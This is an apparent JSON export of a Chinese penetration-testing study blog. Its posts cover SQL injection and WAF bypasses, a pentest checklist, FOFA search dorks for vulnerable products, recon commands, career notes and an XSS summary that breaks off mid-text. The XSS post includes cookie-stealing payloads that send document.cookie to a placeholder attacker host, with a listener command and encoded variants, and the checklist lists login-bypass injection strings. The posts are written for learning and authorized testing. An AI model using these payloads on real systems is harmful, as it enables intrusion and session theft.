#判断数据库版本\n\nand if(ascii(substring(database(),1,4))&gt;97,sleep(5),1)   #判断数据库名\n\n上面加了一些函数的用法，以达到获取信息\n\n二次注入二次注入的使用是将语句带入数据库，在另外一个地方查询数据库信息时，执行该语句，返回执行结果\n比如：\n在注册用户时，将用户名设置为 aaa&#39; order by 7%23\n在另外查询用户数据的地方，存在带入查询，就会执行该语句\n之后不断修改用户名，再不断查询用户名返回结果，达到注入目的\n\n宽字节注入在数据库使用GBK、GB18030、BIG5等编码时，可能存在宽字节注入\n在注入点使用了addslashes()等转义单引号，如：\n?id&#x3D;1&#39;   返回 id&#x3D;1\\&#39;\n\\在宽字节中编码为%5c,使用%df，则会将其转化为繁体字，从而绕过了单引号过滤\n?id&#x3D;1%df&#39;   这样进行注入\n\n其他特殊注入cookie注入\n\nxff头注入\n\nxml实体注入\n\n伪静态注入：\n在F12控制台输入：javascript:alert(document.lastModified)\n回车弹框时间，然后等几秒再来一次，查看时间是否和上次的相同，如果相同就证明是静态的，如果时间和上次不同，则是伪静态的网站   #https:&#x2F;&#x2F;blog.csdn.net&#x2F;p_utao&#x2F;article&#x2F;details&#x2F;108654640\n\n等等，大差不差\n\nAccess偏移注入：知道了表名，不知道字段的时候\n1.判断字段数 order by\n2.判断表名  使用union select * from 表名,如admin\n3.偏移注入  利用公式注入\n?id&#x3D;1+union+select+1,2,3,4,5,6,7,8,9+from+admin\n?id&#x3D;1+union+select+1,2,3,4,5,*+from+admin  \n#一个一个测试，到5用*号代替显示正常，利用公式\n9-5&#x3D;4;9-4*2&#x3D;1;则从1之后开始\n当前admin表中字段数就为4；\n?id&#x3D;1+union+select+1,a.id,b.id,*+from+(admin+as+a+inner+join+admin+as+b+on+a.id&#x3D;b.id)\n\nWAF绕过常用的：\nor–+2&#x3D;!!!2 类假!!!2为真的结果，利用不变逻辑的!!!替代空格\n注释替代 and&#x2F;&#x2F;select&#x2F;&#x2F;uname&#x2F;&#x2F;from&#x2F;&#x2F;users\n+号连接字符替换\n大小写、双写、AND&#x2F;&amp;&amp;,OR&#x2F;||、&#x2F;*!xxx*&#x2F;、&#x2F;**&#x2F;、url编码、base64编码\n\n空格替换：\n%0a  新建一行\n%09  TAB键（水平）\n%0d  return功能\n%0b  TAB键（垂直）\n%0c  新建一页\n%20  就是空格\nhex编码\n\nemoji绕waf\n脏数据绕waf\n畸形协议绕过,该post为上传，burp一键切换\n替换常用的可能被waf屏蔽的函数\n\nCVE-2022-34265   Django  sql注入漏洞复现使用vulhub环境\ndocker-compose up -d   #启动环境\n\ndocker ps    #查看服务端口\n\ndocker-compose down -v  #关闭环境，为啥，第二次使用不用下载直接启动\n\n访问IP:8000\n","slug":"SQL注入2","date":"2022-07-15T12:05:32.000Z","categories_index":"安全漏洞基础","tags_index":"owasp TOP 10","author_index":"Longw"},{"id":"a208cc555303d3d7e79b97f2e2214046","title":"Hack如何学习","content":"InsiderPhD的HACK如何学习笔记关于各种人员学习hack​            找漏洞不要想着只学ctf，这就是学习用的，很难转化为实战。比如说找个xss，你用ctf的payload很难在现实找到，因为大多数厂家都会防御这种攻击。\n​           从ctf转化为实战从来不是一件简单的事情。\n​           你应该学习理论，实战和ctf互相转化。以巩固学习经验。\n​           你应该尝试hack，不管你会或者是不会，你都可以去尝试，这是一个非常好的开始。\n​           同样，学习hack，请开始学习一门编程语言，她推荐她喜欢的php，因为php真的很简单。当你学习php并且完成一个项目后，你可以尝试攻击这个项目。你在学习php做项目的时候，会学习如何防止sql注入，如何过滤xss。当你尝试hack你的项目，并且成功后，你就能将他们结合起来。互相提升。然后你可以尝试学习ctf。这样能让你知道别人在这方面的思路。之后，你可以不断阅读和不断尝试hack。并且推荐你不断进行这两步。\n​          如果还在学校，学习学校提供的便宜的安全课程。还有参加当地的hack聚会，参与学校hack俱乐部等等。\n​          如果你是一位有技术的人，你可以尝试真实的hack一个目标，这样能让你沉浸在真实的hack过程中，而不是不断地学习各种知识。\n​          如果你实在没有时间，你可以参与在线社区之类的。\n​          如果你是一名开发人员，拥有编程经验，十分推荐你从owasp top 10开始学习。然后阅读一些关于你学习的语言方面的文章。比如，你是php开发者，你可以尝试一些包含漏洞。这能让你从理论转化为实战，特别是当你已经拥有防御漏洞的知识。之后，你在阅读常用书籍的时候可以尝试ctf练习，因为你拥有开发经验你更容易理解他们是如何构建的。\n​          如果你在安全方面已经拥有了很多知识，但是你更擅长防御。那么你可以尝试阅读攻击者在某一方面的攻击文章。他们一般擅长攻击而不是如何安全防御。\n​         如果你是一名工程师之类的人员，你更加擅长硬件方面的知识，对于软件了解较少。你可以从初学者学起，可以在学习过程中跳过你已经会的内容。这样可以快速填补你的空白方面，之后你可以尝试真实攻击目标。\n​        最想推荐的就是，你要尝试真实攻击目标，因为这是你学习的目标。建议尽快到达这一步。还有，永远不要停止学习。尽管你可能成功，拥有一个或者多个bug。当你拥有这些后，你可能会感到无聊，甚至感觉自己还是一个初学者，这时候你就要尝试加入一些社区。社区在学习方面很不错，特别是当你还是一个初学者。可以尝试借鉴他人hack的经验。并且与比你技术更好的人交朋友。这样可以拓展业务，也可以帮助你发展你的整体技能。之后，你就可以尝试分享你的知识，帮助和以前的你一样的初学者。\n​        最推荐的资源就是hack会议。不管你对这方面是什么意见。你要像学习科学论文知识一样思考他们为何这样做。这样学习他人的想法能帮助你拓展思维。你拥有你自己独特的眼光来看待世界，同样你拥有自己独特的方法去hack。\n​       ctf入门社区：https://ctf.hacker101.com/\n​       入门靶场：http://www.dvwa.co.uk/\n​       OWASP：https://owasp.org/www-project-juice-shop/\n​       完整的渗透测试学习：https://www.youtube.com/watch?v=WnN6dbos5u8&amp;t=0s  （有相关作业，学完就是完整的初级）\n","slug":"Hack如何学习","date":"2022-04-04T15:04:49.000Z","categories_index":"","tags_index":"hack学习","author_index":"Longw"},{"id":"bc7db7781838613256ae7ac419cf7231","title":"渗透测试工作流程:checklist","content":"\n\n由来最近看p牛直播讲他学习安全的路程和经验（p牛大家都应该认识）。其中也讲到了渗透测试的经验，他说不好弄是很正常的，手忙脚乱也是很正常的。因为我们没有将渗透测试流程化，表单化。我们在现场时，也许不能完整的进行测试。往往在扫描工具没找到重要漏洞、手测一般漏洞也没有找到问题时就找不到方向了。\n所以，将渗透测试流程化，表单化。方便我们在一时没找到头绪是也能将流程做下去，不至于发呆😐懵逼。\n实习了应该两个月了。从一开始的什么都不清楚，到现在有了一点经验。反正就是及时总结吧！\n常见渗透测试漏洞现在总结一下我在进行渗透测试时遇到最多的漏洞。\n\n弱口令\n明文传输\n越权\n反射xss\n\n这些就是我在两个月实习过程的成果，这么一点点问题。\nchecklist（我现在还是菜鸟，流程还不是总结很好，后面会一直更新的）感谢组里老大Rain提供的流程黑盒测试漏洞扫描遇事不决，先扫一波1. 对于网站使用awvs或是appscan，我习惯awvs，还有Netsparker。最好都来一发看看。\n2. 对于主机，使用Nessus，配合插件。\n3. 还有使用goby，好处就是各种插件，就方便了。\n4. 最近出了个qingscan的集成扫描器。可以去GitHub上找到，最好安装到服务器里面，到时候就能让团队成员一起使用了。\n\n 先挂在那边扫着，等等看成果。\n结果验证这个不用讲了，就是将漏洞扫描的结果去验证一下。运气好直接能getshell了。\n经验漏洞这个就看你经验了，就是你以前遇到过或者你知道有这个漏洞。那不就直接验证先吗？像常见oa系统漏洞，常见越权漏洞等等。\n还有就是多多复现漏洞，多多将各种常见的poc在靶场和实战利用利用。\n信息收集直接给后台也要信息收集，对于公布在网络上的系统可以进行正常流程信息收集。对于内网，专网那就找接口信息泄露，推荐一个插件FindSomething。\n找各种js的泄露接口，发包查看返回内容。\n这个可以等后面的测完在慢慢找。\n信息收集的完整流程可以看看这篇，写的比我全：https://blog.zjun.info/2022/web-penetration-information-collection-checklist.html#\n扫描路径\ndirsearch \n\ndirmap\n可能会找到一点惊喜，最好是找到一些敏感路径就在那个路径下再次扫描一波，这样更加全面。\n\n御剑后台扫描\n\n\n抓包分析明文传输单位一般给后台，直接测试一下就行了。\n弱口令后台测试，开始先自己手测一下，看看效果和能不能爆破。\n能爆破就burp抓包爆破。\n测试账号未删除网站编写测试时用到的账号，一般为13333333333这种的。\n短信轰炸还有登录页面是短信登录就可以测试短信轰炸\n还有一个小点，有的单位甚至短信验证码直接都不改的。来两次看看，要是不变这不就可以爆破账号了。\n登录页面Xss这个就不用讲了，看见框就插一波。登录页面抓包后，看提交的参数，每个参数都给他插一遍。\n怕麻烦就用工具，或者是将常用的测试Xss总结起来，用burp直接爆。\n登陆页面sql注入常见的，在账号框内输入\nadmin&#39; or 1&#x3D;1#\nadmin&#39; or 1&#x3D;1 --+\nadmin&#39;) or 1&#x3D;1 --+\nadmin&#39;) or 1&#x3D;1 #\n\n这个可以总结一下各种闭合绕过形成字典，直接burp设置payload爆破测试。\n登录绕过比如修改登录返回包参数，在客户端这边直接登录后台。\n任意注册应该是有些不对外开放的平台，能随意注册导致泄露平台中的一些敏感信息之类的问题。\n框架/组件/插件漏洞常见的\njeecgboot未授权\n\ndruid后台\n\nspring boot\n\nswagger接口未授权\n等等\n\n\n越权测试所有查询点越权观察查询点是否使用token，尝试逆向\n所有操作点越权管理账号cookie和普通账号cookie测试\n正常漏洞测试sql注入payload看以前的sql注入总结\n[]: https://longwblog.com/post/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93\nsqlmap使用\nXss看见框就插试试看，留言、评论都可以试试\n当然，要在授权允许的情况下进行。\n也是有工具测试的\n文件上传就上传绕过测试\n命令执行得找到命令执行的功能点，在测试\nCSRF一般与xss结合，诱人点击执行。\nXXE等队友补充\nSSRF服务端请求伪造等队友补充\n文件包含这个真的不常见\n逻辑漏洞像订单金额修改，简单验证码之类的。一般使用弱伪随机数。\n其实上面的真要测试也是挺复杂的，每个地方的测试的话肯定要花一定的时间。但是因为常见，又是入门学习的漏洞所以简单写一下。\n当然，在信息收集过程若是遇到系统版本号之类的，可以去查一下对应版本的已知漏洞及对应的poc。","slug":"渗透测试工作流程-checklist","date":"2022-01-17T02:26:04.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"dbfc96a8c057ede6b7efcb26a6039a2e","title":"利用网络空间测绘挖洞","content":"\n\n网络测绘空间信息安全发展到现在，各种辅助工具不断地跟新换代。其中对我们最重要的除了burp那几样之外，就是这个网络测绘空间了。他的定义直接百度就行了，这次学习的是如何使用他为我们在进行渗透测试和漏洞挖掘。\n在如今年代，他在渗透测试和漏洞挖掘方面甚至比Google等搜索引擎更加强大。他有固定的语法能让我们直接找到安装对应应用的系统主机。方便我们在找到0day去批量找对应系统或是验证某些刚刚公布的漏洞。\n常用的网络测绘空间国内以前最著名的就是fofa了，不得不说以前在国内绝对可以算是最强。但是最近新出了一个360的网络测绘空间。在实战找漏洞方面，我亲测比fofa好用一点。\n原因有很多，最主要有一个fofa需要会员。这个其实也不算大问题。但是嘛！同样的语法360搜索的内容是fofa的好几倍。这样我们的测试面就广了，找到有漏洞系统的机会也就多了。\nfofa：https://fofa.so\n360：https://quake.360.cn\n钟馗之眼：https://www.zoomeye.org\n这几家就是国内常见的网络测绘空间。\nfofa语句（来自csdn：NoOne_52）Apache Flink未授权访问+远程代码命令执行\n\napp&#x3D;&quot;APACHE-Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;\nApache-Shiro\n\n\napp&#x3D;&quot;Apache-Shiro&quot;\n\n\n威胁情报-挖矿啥的\nbody&#x3D;&quot;miner.start(&quot;&amp;&amp;header!&#x3D;&quot;Mikrotik HttpProxy&quot;&amp;&amp;country&#x3D;CN\n\n目录遍历\nbody&#x3D;&quot;miner.start(&quot;&amp;&amp;header!&#x3D;&quot;Mikrotik HttpProxy&quot;&amp;&amp;country&#x3D;CN\n\n回手掏之目录遍历\nbody&#x3D;&quot;Directory listing for&quot;||title&#x3D;&quot;index of &#x2F;&quot;||body&#x3D;&quot;转到父目录&quot;\n\nxxl-job-admin漏洞系列，如很早的弱口令和后台计划弹shll\n(body&#x3D;&quot;xxl-job-admin&quot;||body&#x3D;&quot;&lt;a&gt;&lt;b&gt;XXL&lt;&#x2F;b&gt;JOB&lt;&#x2F;a&gt;&quot;)&amp;&amp;body&#x3D;&quot;任务调度中心&quot;\n\n\nAdobe ColdFusion跨站脚本漏洞\napp&#x3D;&quot;Adobe-ColdFusion&quot;\n\nApache Solr远程代码执行漏洞\napp&#x3D;&quot;Solr&quot;\n\nCVE-2019-17558 Apache Solr Velocity模板远程代码执行\nheader&#x3D;“rememberme&#x3D;deleteMe”、header&#x3D;“shiroCookie”\n\nWeblogic\n(app&#x3D;&quot;BEA-WebLogic-Server&quot; || app&#x3D;&quot;Weblogic_interface_7001&quot;) &amp;&amp; country&#x3D;&quot;CN&quot;\n\n深信服VPN远程代码执行（2019 攻防演练）\nheader&#x3D;&quot;Set-Cookie: TWFID&#x3D;&quot;\n\ntitle&#x3D;&quot;Whoops!&quot; &amp;&amp; country&#x3D;&quot;CN&quot;\n\ntitle&#x3D;”abc”  \nheader&#x3D;”abc” \nbody&#x3D;”abc” \ndomain&#x3D;”xx.com” \nhost&#x3D;”.xx.cn” \nport&#x3D;”443”    \nip&#x3D;”1.1.1.1” \nprotocol&#x3D;”https” \ncity&#x3D;”Beijing” \nregion&#x3D;”Zhejiang” \ncountry&#x3D;”CN” \ncert&#x3D;”xx.com” \nip&#x3D;&quot;111.1.1.1&#x2F;8&quot;\n\nip&#x3D;&quot;111.1.1.1&#x2F;16&quot;\n\nip&#x3D;&quot;111.1.1.1&#x2F;24&quot;\n\nports&#x3D;&quot;3306,443,22&quot;  搜索同时开启3306端口、443端口和22端口的IP\nports&#x3D;&#x3D;&quot;3306,443,22&quot;  搜索只开启3306端口、443端口和22端口的IP\n\n原文链接：https://blog.csdn.net/weixin_45682070/article/details/109546750\n这些语句应该都是通用的，这样在几家同时找一下。看看搜索结果对比一下就知道谁的搜集范围更加普遍。\n验证当然，再找到对应版本的资产后。我们也要知道对应的poc，这样方便我们进行利用。以前在网上有公布的免费poc库，但是现在给关闭了。所以就需要你们发挥自己的大脑去网上找了。当然，最好是自建一个poc网站。自用能找到就行，但是如果是团队，还是建个内部poc库方便一点。毕竟这样方便及时更新poc库，人多总是力量大的。\n","slug":"利用网络空间测绘挖洞","date":"2022-01-13T11:07:43.000Z","categories_index":"安全漏洞基础","tags_index":"实战","author_index":"Longw"},{"id":"6ba198a2b679996222b6a9277b704dc9","title":"实习小结","content":"\n\n实习都一个半月了，小结一下吧！\n真的就像b站那位红队大佬讲的那样，学的也不算太少但是还是什么都干不了。可是学会了和没学会是不同的概念，即便学会之后忘了。\n半个月时间，渗透测试方面也看了许多文章，学了很多的技巧。在fofa上找对应的网站测试也是行的。但是吧，我实习是干等保的。只能对给的网站下手，以为能秒天秒地秒空气的随便日进内网。结果却发现你除了用工具扫描之后复现一下，查一查接口有没有未授权基本上什么都干不了。\n\n菜的扣脚啊！还好最近发现了那位up主。听他传授经验才发现大家都是一样的。\n还是得找准方向。虽然最近没学习代码语言方面的知识。但是一直在学习等级保护测评师的教材，也算是对这份工作有了深入的了解了。毕竟这是实习考核啊！过不了得滚蛋！！！先把这个努力学好，再对其他方面的努力学习吧。\n最近的学习有了框架，感觉对测评方面打下了不错的基础。学东西也渐渐快了起来，也可以对新人说说要理解着学习了！\n知道了自己的水平，找准自己感兴趣的方向，然后努力往那个方向前进。\n后面除了测评内容，还需要学习php和java代码审计，然后是对脚本编写方面深入学习一下。还有平时要不断学习各种常见的漏洞，学会他们的打法。最后就是多多总结关键点，形成自己的风格。\n\n","slug":"实习小结","date":"2022-01-09T04:46:21.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"31f05bcb8807c536b785c3c2b7399b78","title":"java版本切换","content":"\n\nJDK版本切换我们在进行渗透测试时会用到许许多多的工具，一般的工具需要Java8而有的工具如最新版burp则需要Java11版本。这时候就需要进行JDK的版本切换。\nWindows下的JDK版本切换以JDK8和JDK11为例。我们在官网分别下载好安装包。先安装Java8，默认安装路径在C盘。一直确定就行了。安装完成后配置环境变量，网上一堆教程，这边还是讲一下吧。\n以win10为例，右击此电脑，选择属性，选择右边的高级系统设置。\n选择环境变量，之后可以选择在user或是系统变量两者反正网上两个都加了。分别点击新建。进行如下操作：\n\n\n之后我们，进入系统变量的path中。点击新建，如果java默认安装在C盘则是这个路径：\nC:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n\n然后一直确定，就ok了。\n之后我们打开cmd，输入：\njava -verion \n\n\njavac -version\n\n\n当看都如图所示结果，则代表我们的Java8已经完美安装成功了。\n之后直接安装Java11。双击安装包，将安装路径的默认C盘改为D盘。其它就一直确定就行了。\n一定一个C盘一个D盘，如果都在C盘会发生路径重复之类的事情，反正非常麻烦。\n切换版本进入主题，当安装完成后如何切换版本。目前在网上看到的自动化切换脚本都不是太行。\n那就只能手动切换了。完美将Java8的安装路径和Java11的安装路径分别记录到一个txt文本中。\n按照配置环境变量的过程。打开环境变量后，将前面设置好的JAVA_HOME分别进行修改，将路径改为Java11的路径。用户变量和系统变量同时修改。之后修改系统变量中的path，找到Java那一行，将前面设置的C盘路径修改为D盘路径。\nC:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n修改为\nD:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n\n之后我们一直确定就行。\n完成后，打开cmd。输入：\nJava -version\n\n\njavac -verison\n\n\n将看到如图所示结果，表明我们的JDK版本已经修改完成了。\n记住一定要两个命令结果都显示同一版本才行，不然又会发生一些难以理解的问题。还有每次切换完要重新打开cmd才行。不然你看到的还是原来的版本。\nLinux下JDK版本切换这个网上教程一堆，以后有机会在记录。\n\n","slug":"java版本切换","date":"2021-11-26T06:48:05.000Z","categories_index":"Java版本切换","tags_index":"Java","author_index":"Longw"},{"id":"1b77ba18c55109a4d53f945700a7bb03","title":"信息收集流程","content":"\n\n信息收集的重要性简单说，你能不能挖到东西。能不能多挖东西，就看你信息收集的程度。\nwhois信息收集拿到对方网站域名，在站长之家或是在kali中进行whois查询。\nkali中直接\nwhois &lt;域名&gt;    \n如果返回的是英文，那可以直接百度翻译或是谷歌翻译。\n\n嫌麻烦可以直接站长之家进行查询：http://whois.chinaz.com/\n还有这些：https://whois.aliyun.com/ 、 https://www.whois365.com/cn/、 https://whois.aizhan.com/ \n子域名信息收集有时候主域名很难搞，就可以从子域名下手。\n1、子域名挖掘工具 如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机。\n2、搜索引擎挖掘 如： 在Google中输入 site:sina.com\n3、第三方网站查询：http://tool.chinaz.com/subdomain、https://dnsdumpster.com/\n4、证书透明度公开日志枚举：https://crt.sh/ 、http://censys.io/\n5、其他途径：https://phpinfo.me/domain 、http://dns.aizhan.com\n敏感信息收集其实敏感信息在护网时可以当作漏洞提交了。\n例如：数据库文件、SQL注入、服务器配置信息、甚至是通过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息。从而达到渗透测试的目的。\n\n\n\n关键字\n含义\n\n\n\nsite\n指定搜索域名 例如：site:baidu.com\n\n\ninurl\n指定URL中是否存在某些关键字 例如：inurl:.php?id=\n\n\nintext\n指定网页中是否存在某些关键字 例如：intext:网站管理\n\n\nfiletype\n指定搜索文件类型 例如：filetype:txt\n\n\nintitle\n指定网页标题是否存在某些关键字 例如：intitle:后台管理\n\n\nlink\n指定网页链接 例如：link:baidu.com 指定与百度做了外链的站点\n\n\ninfo\n指定搜索网页信息 info:baidu.com\n\n\n还有这个高级用法查询：https://www.exploit-db.com/google-hacking-database\n还有从数据包中发现目标用到编程语言和服务器信息。\n在GitHub上进行收集信息这个其实得看前面收集信息的程度。\nGithub之邮件配置信息泄露：site:Github.com smtp、site:Github.com smtp @qq.com\nGithub之数据库信息泄露：site:Github.com sa password、site:Github.com root password、site:Github.com User ID=’sa’;Password\nGithub之svn信息泄露：site:Github.com svn、site:Github.com svn username\nGithub之综合信息泄露：site:Github.com password、site:Github.com ftp ftppassword、site:Github.com 密码、site:Github.com 内部\n收集真实IP地址先看是否有CDN，使用：http://ping.chinaz.com/\n没有使用CDN可以直接PING\n如果目标使用CDN，需要绕过CDN来获取真实IP地址。1、内部邮箱源  收集到内部邮箱服务器IP地址2、网站phpinfo文件 phpinfo.php3、分站IP地址，查询子域名  CDN很贵，很有可能分站就不再使用CDN。4、国外访问  https://asm.ca.com/en/ping.php5、查询域名解析记录  https://viewdns.info/\n当收集到真实IP就可以直接访问，如果和网址访问一样就代表真实IP，否则则为假。\n端口信息收集使用nmap进行端口扫描\nnmap -A -v -T4 IP   #快速全面探测\nnmap IP --script banner -p 22   #探测22好端口banner信息\nnmap -p 端口号 -sV IP  \nnmap -O IP   #获取操作系统的信息\nnmap -A -V IP   #对目标进行完整的测试\n\n使用masscan\nmasscan --ports 1-10000 目标IP --adapter-ip 本机IP\n\n--adapter-ip 指定发包的ip地址\n\n--adapter-port 指定发包源端口\n\n--adapter-mac 指定发包的源MAC地址\n\n--router-mac 指定网关MAC地址\n\n--exclude IP地址范围黑名单，防止masscan扫描\n\n--excludefile 指定IP地址范围黑名单文件\n\n--includefile,-iL 读取一个范围列表进行扫描\n\n--wait 指定发包后的等待时间\n\n使用Dmitry\ndmitry -p IP\ndmitry -pb IP #获取banner信息\n\n使用netcat\nnc -nvz IP 端口范围\nnc -nvz 192.168.249.110 20-30\nnc -Vn IP 端口号 #获取端口banner信息\n\n\n\n\n端口\n端口说明\n攻击方法\n\n\n\n22\nSSH远程连接\n爆破、SSH隧道及内网代理转发、文件传输\n\n\n23\nTelnet远程连接\n爆破、嗅探、弱口令\n\n\n3389\nrdp远程桌面\nShift后门、爆破\n\n\n5900\nVNC远程连接\n弱口令、RCE\n\n\n5632\nPcAnywhere远程连接\n嗅探、代码执行\n\n\n收集web站点信息CMS在线识别：http://whatweb.bugscaner.com/look/  、 http://www.yunsee.cn/finger.html\nCMS本地识别：whatweb、御剑web指纹识别程序、大禹CMS识别程序 https://github.com/Ms0x0/Dayu\nCMS漏洞查询利用：https://bugs.shuimugan.com\n后台扫描探测工具：\n老版本：                                                              新版本：\n1、御剑后台扫描工具                                         dirmap2、wwwscan命令行工具                                    dirsearch3、dirb命令行工具                                              .git源码泄露4、dirbuster扫描工具\n国外的网站使用wordpress,可以使用wpscan工具进行安全测试。\n使用扫描网站对IP进行探测使用shodan：https://account.shodan.io\n使用钟馗之眼：https://www.zoomeye.org/\n使用FOFA：https://fofa.so/\n使用shodan查看是否有蜜罐：\nshodan honeyscore IP地址\n\n使用集成工具进行信息收集HGather：https://github.com/BaizeSec/HGather\nrailgun：https://github.com/lz520520/railgun  这是使用说明书\n以上内容大部分来自网络。。。。。。\n","slug":"信息收集流程","date":"2021-11-20T11:43:56.000Z","categories_index":"流程","tags_index":"信息收集","author_index":"Longw"},{"id":"c5a6228e829628ebe329c5df737b79b7","title":"第一次护网","content":"\n\n老实讲，这个我都不好意思放出来。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。\n。。。。。、\n、。。。。、。。\n。。。。。。\n。。。。。\n。。。。\n。。。。。\n。。。\n。。。。。\n.。。。。。\n。。。。。\n。。。。。\n。。。。。\n。。。。\n。。。\n。\n。。。。。\n但是要知耻后勇。。。\n小计没想到第一次护网居然是老家。。。。。。。。\n临近年关，等保测评一大批，居然还有护网，虽然只有红队。刚刚实习就上战场了。让我颇感无奈。。。\n不过实战也是学习最多的，基础薄弱啊。。学的杂并且很浅。。。\n一开始发了一些测试网站，尝试入侵。结果不知道如何下手，准备先用扫描工具扫描一波。。更无奈的是awvs又出问题了！！！！无奈只好卸载。卸载好准备重装，结果弹窗重启，电脑卡死了。。。只好强制关机。重启后使用appscan扫描了一个站点，无发现。再次使用弹窗电脑阻止运行。😅😅😅！！！！！！！！！！！！\n没办法了，只有手测。一个一个试试。后台很多，不幸的是我跑的后台基本都不能爆破。好不容易找到弱口令再想上交已经不加分了。😅\n一心想着sql注入，尝试了一批站点全是防火墙过不去。。。。。注册论坛，xss发布任务也没有弹窗。。\n乱打一通，全部白干。。。。。。。。。。。。。。。。。\n好笑的是旁边盛世航明主办方的队伍还在那里嘲讽。。。虽然我没有丧失信心，但是还是挺羞愧的。\n也是挺佩服他们的，短短几个小时就攻下了好几个站点。。。\n经验忽略了最要紧的信息收集，吃了很大很大的亏。。。。下决心，先把这方面弄到流程化。\n其他先按部就班的学吧。还要会对cve漏洞进行利用。\n不够细心，容易忽略细节，关键就是细节。\n看了一下另一支队伍挖到的sql注入，不仅是他信息收集做的好，还有他很细心。一直手动测试，结果发现忽略了工具的使用。\n思路很重要，但是你得到一定水平才知道该怎么办。\n一定要定一个流程，没什么发现就按照流程走一遍。有了发现才能进行深入。\n反正也是加油吧！！！努力学习！！！希望有一天也能打个护网前几试试。\n","slug":"第一次护网","date":"2021-11-19T15:36:33.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"092a8eb566bb4d51073324d6cfbab7e6","title":"XSS总结","content":"\n\npayload来自csdn-仙女象\n反射型XSS&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&lt;&#x2F;script&gt;  \n#获取cookie，需要攻击机开机http服务\npython2 -m SimpleHTTPServer 8899\n\n大小写绕过\n使用其他标签\n编码绕过\n&lt;sCript&gt;alert(1)&lt;&#x2F;script&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;alert(1)&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;\n\n&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&#39;&amp;#60;&amp;#105;&amp;#109;&amp;#103;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#105;&amp;#112;&amp;#58;&amp;#56;&amp;#56;&amp;#57;&amp;#57;&amp;#47;&#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#43;&#39;&amp;#34;&amp;#47;&amp;#62;&#39;&amp;#41;&gt;hh&lt;&#x2F;a&gt;\n#onclick后面是html实体编码了，明文payload是&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;hh&lt;&#x2F;a&gt;\n\n&lt;img alt&#x3D;x οnmοuseοver&#x3D;alert(1)&gt;\n&lt;img alt&#x3D;x οnmοuseοver&#x3D;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&gt;\n&lt;input οnblur&#x3D;&quot;alert(1)&quot;&gt;\n&lt;input οnblur&#x3D;&quot;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&quot;&gt;\n\n存储型XSS&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;ip:8899&#x2F;&#39;+document.cookie+&#39;&quot;&#x2F;&gt;&#39;)&lt;&#x2F;script&gt;\n#获取cookie，需要攻击机开机http服务\npython2 -m SimpleHTTPServer 8899\npython3 -m http.server 8899\n\n修改客户端源代码绕过长度限制\n大小写绕过，双写绕过\n&lt;scrip&lt;script&gt;t&gt;alert(1)&lt;&#x2F;scrip&lt;script&gt;t&gt;\n&lt;img src&#x3D;x οnerrοr&#x3D;alert(1)&gt;\n&lt;iframe οnlοad&#x3D;alert(1)&gt;&lt;&#x2F;iframe&gt;\n\n&lt;a href&#x3D;&quot;&quot; οnclick&#x3D;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&#39;&amp;#60;&amp;#105;&amp;#109;&amp;#103;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#105;&amp;#112;&amp;#58;&amp;#56;&amp;#56;&amp;#57;&amp;#57;&amp;#47;&#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#43;&#39;&amp;#34;&amp;#47;&amp;#62;&#39;&amp;#41;&gt;hh&lt;&#x2F;a&gt;\n\n\nDOM型XSS-payload来自csdn谢公子http:&#